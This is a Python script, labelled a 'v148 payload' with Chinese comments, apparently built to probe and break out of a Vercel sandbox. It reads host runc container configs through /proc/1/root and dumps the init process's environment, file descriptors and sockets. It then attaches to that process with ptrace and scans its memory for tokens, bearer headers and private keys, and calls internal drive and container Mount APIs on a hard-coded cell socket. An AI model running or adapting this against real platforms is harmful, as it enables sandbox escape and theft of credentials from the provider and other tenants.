# -*- coding: utf-8 -*-
"""v148 payload: sandbox-init 完整 config + init.sock 认证公钥 + 进程内存凭据 + host API socket 定位
输出 /vercel/sandbox/v148c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v148c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
DRV = '/vercel.hive.cell.api.drives.v1.DrivesService'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=2.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def readp(pid, name, n=4000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


# ============ 1: sandbox-init 完整 config.json ============
log('=== 1 sandbox-init config ===')
runc_dir = None
try:
    for d in sorted(os.listdir(R + '/run/cell/runc')):
        runc_dir = R + '/run/cell/runc/' + d
        cfg_path = runc_dir + '/config.json'
        data = open(cfg_path, 'rb').read()
        log('config.json size=%d' % len(data))
        try:
            cfg = json.loads(data)
        except Exception as e:
            log('json parse EXC %s, raw tail: %r' % (e, data[-800:]))
            cfg = None
        if cfg:
            proc = cfg.get('process', {})
            log('process.user=%s' % proc.get('user'))
            log('process.args=%s' % proc.get('args'))
            log('process.env=%s' % proc.get('env'))
            log('process.cwd=%s' % proc.get('cwd'))
            log('process.capabilities=%s' % json.dumps(proc.get('capabilities', {}))[:600])
            log('process.rlimits=%s' % proc.get('rlimits'))
            log('root=%s' % cfg.get('root'))
            for m in cfg.get('mounts', []):
                log('mount dest=%s src=%s type=%s opts=%s' % (
                    m.get('destination'), m.get('source'), m.get('type'), m.get('options')))
            log('annotations=%s' % cfg.get('annotations'))
            log('linux.namespaces=%s' % [n.get('type') for n in cfg.get('linux', {}).get('namespaces', [])])
            log('linux.cgroupsPath=%s' % cfg.get('linux', {}).get('cgroupsPath'))
            log('linux.resources=%s' % json.dumps(cfg.get('linux', {}).get('resources', {}))[:400])
        # container.pid
        try:
            pid = open(runc_dir + '/container.pid').read().strip()
            log('container.pid=%s' % pid)
        except Exception as e:
            log('container.pid EXC %s' % e)
except Exception as e:
    log('runc scan EXC %s' % e)

# ============ 2: /run/vercel/share 侦察 ============
log('=== 2 /run/vercel ===')
for base in ['/run/vercel', '/run/vercel/share', R + '/run/vercel', R + '/run/vercel/share']:
    try:
        for name in sorted(os.listdir(base)):
            p = base + '/' + name
            st = os.stat(p)
            if st.st_mode & 0o170000 == 0o040000:
                log('%s/ = %s' % (p, sorted(os.listdir(p))[:30]))
            elif st.st_mode & 0o170000 != 0o140000:
                data = open(p, 'rb').read(2000)
                log('%s (%d): %r' % (p, st.st_size, data[:600]))
            else:
                log('%s (socket)' % p)
    except Exception as e:
        log('ls %s EXC %s' % (base, e))

# ============ 3: sandbox-init 进程侦察 ============
log('=== 3 init proc ===')
init_pid = None
try:
    if runc_dir:
        init_pid = int(open(runc_dir + '/container.pid').read().strip())
except Exception:
    pass
if init_pid:
    log('init pid=%d comm=%r' % (init_pid, readp(init_pid, 'comm', 100)))
    log('init cmdline=%r' % readp(init_pid, 'cmdline', 800))
    log('init environ=%r' % readp(init_pid, 'environ', 4000).decode(errors='replace').replace('\x00', ' | '))
    try:
        log('init cwd=%s' % os.readlink('/proc/%d/cwd' % init_pid))
        log('init exe=%s' % os.readlink('/proc/%d/exe' % init_pid))
    except Exception as e:
        log('init links EXC %s' % e)
    # fd 列表 (找 unix socket / 控制面连接)
    try:
        for fd in sorted(os.listdir('/proc/%d/fd' % init_pid)):
            try:
                tgt = os.readlink('/proc/%d/fd/%s' % (init_pid, fd))
                if 'socket' in tgt or 'init.sock' in tgt or 'pipe' in tgt:
                    log('init fd %s -> %s' % (fd, tgt))
            except Exception:
                pass
    except Exception as e:
        log('init fd EXC %s' % e)
    # 网络连接
    try:
        tcp = readp(init_pid, 'net/tcp', 4000).decode(errors='replace')
        for ln in tcp.splitlines()[1:]:
            parts = ln.split()
            if len(parts) > 3:
                st_code = parts[3]
                if st_code in ('01', '02', '03', '06'):
                    log('init TCP %s state=%s' % (parts[1], st_code))
    except Exception as e:
        log('init net EXC %s' % e)
    # unix socket 列表
    try:
        unix = readp(init_pid, 'net/unix', 4000).decode(errors='replace')
        for ln in unix.splitlines()[1:]:
            if ln.strip():
                log('init UNIX %s' % ln[:200])
    except Exception as e:
        log('init unix EXC %s' % e)
    # maps 摘要
    try:
        maps = readp(init_pid, 'maps', 8000).decode(errors='replace')
        rw = [ln.split()[0] for ln in maps.splitlines() if 'rw' in ln.split()[1] and len(ln.split()) > 2]
        log('init rw map regions=%d, first=%s' % (len(rw), rw[:8]))
    except Exception as e:
        log('init maps EXC %s' % e)

# ============ 4: ptrace 内存扫描 ============
log('=== 4 mem scan ===')
if init_pid:
    try:
        scope = open('/proc/sys/kernel/yama/ptrace_scope').read().strip()
        log('ptrace_scope=%s' % scope)
    except Exception:
        pass
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, init_pid, 0, 0)  # PTRACE_ATTACH
        err = ctypes.get_errno()
        log('PTRACE_ATTACH rc=%d errno=%d' % (r, err))
        if r == 0:
            time.sleep(0.3)
            try:
                maps = open('/proc/%d/maps' % init_pid).read()
            except Exception:
                maps = ''
            # 只在 rw 段找敏感字符串, 限制扫描量
            kws = [b'eyJ', b'secret', b'Bearer', b'authorization', b'TF4G6bXN', b'-----BEGIN', b'token']
            found_total = 0
            scanned = 0
            for ln in maps.splitlines():
                parts = ln.split()
                if len(parts) < 2 or 'rw' not in parts[1]:
                    continue
                if scanned > 12:
                    break
                addr, size = parts[0].split('-'), int(parts[0].split('-')[1], 16) - int(parts[0].split('-')[0], 16)
                if size > 8 * 1024 * 1024:
                    continue
                scanned += 1
                try:
                    mf = open('/proc/%d/mem' % init_pid, 'rb')
                    mf.seek(int(addr[0], 16))
                    chunk = mf.read(min(size, 2 * 1024 * 1024))
                    mf.close()
                    for kw in kws:
                        for m in re.finditer(re.escape(kw), chunk):
                            s = max(0, m.start() - 60)
                            log('MEM pid%d %s @%x: %r' % (init_pid, kw, m.start(), chunk[s:m.end() + 120]))
                            found_total += 1
                            if found_total > 12:
                                break
                        if found_total > 12:
                            break
                except Exception as e:
                    log('mem read EXC %s' % e)
                if found_total > 12:
                    break
            log('mem scan done found=%d' % found_total)
            libc.ptrace(17, init_pid, 0, 0)  # PTRACE_DETACH
        else:
            log('attach failed errno=%d' % err)
    except Exception as e:
        log('ptrace EXC %s' % e)

# ============ 5: sandboxctrl/containerd socket 定位 ============
log('=== 5 proc sockets ===')
for pid, name in [(1, 'celld'), (534, 'sandboxctrl'), (490, 'containerd')]:
    try:
        unix = readp(pid, 'net/unix', 8000).decode(errors='replace')
        for ln in unix.splitlines()[1:]:
            if ln.strip():
                log('%s UNIX %s' % (name, ln[:180]))
    except Exception as e:
        log('%s unix EXC %s' % (name, e))
    try:
        for fd in sorted(os.listdir('/proc/%d/fd' % pid)):
            try:
                tgt = os.readlink('/proc/%d/fd/%s' % (pid, fd))
                if 'sock' in tgt or '.sock' in tgt:
                    log('%s fd %s -> %s' % (name, fd, tgt))
            except Exception:
                pass
    except Exception:
        pass

# ============ 6: host 侧关键目录 ============
log('=== 6 host dirs ===')
for p in ['/opt/vercel', R + '/opt/vercel', '/var/lib/containerd', R + '/var/lib/containerd']:
    try:
        entries = sorted(os.listdir(p))[:40]
        log('ls %s = %s' % (p, entries))
        for e in entries:
            if e in ('drives', 'drive', 'pools', 'pool', 'cells', 'images'):
                try:
                    sub = sorted(os.listdir(p + '/' + e))[:20]
                    log('  %s/%s = %s' % (p, e, sub))
                except Exception:
                    pass
    except Exception as e:
        log('ls %s EXC %s' % (p, e))

# ============ 7: Mount/GetDriveUsage drive_id 变体 ============
log('=== 7 drive api variants ===')
if runc_dir:
    uuid = runc_dir.split('/')[-1]
    cell_id = 'hvc_iad1_67e93e48_90ec9c37f44a483180c46579d7d6f1bb'
    variants = [
        (CTRS + '/Mount', {'drive_id': uuid}),
        (CTRS + '/Mount', {'drive_id': cell_id}),
        (DRV + '/GetDriveUsage', {'drive_id': uuid}),
        (DRV + '/GetDriveUsage', {'drive_id': cell_id}),
        (DRV + '/Mount', {'drive_id': uuid}),
        (DRV + '/Mount', {'drive_id': cell_id}),
        (DRV + '/List', {}),
        (CTRS + '/List', {}),
    ]
    for path, v in variants:
        st, pay = raw_req(CELL, path, json.dumps(v).encode(), t=3)
        log('%s %r -> %s %r' % (path.split('/')[-1], v, st, pay[:300]))

log('V148_DONE')
f.close()
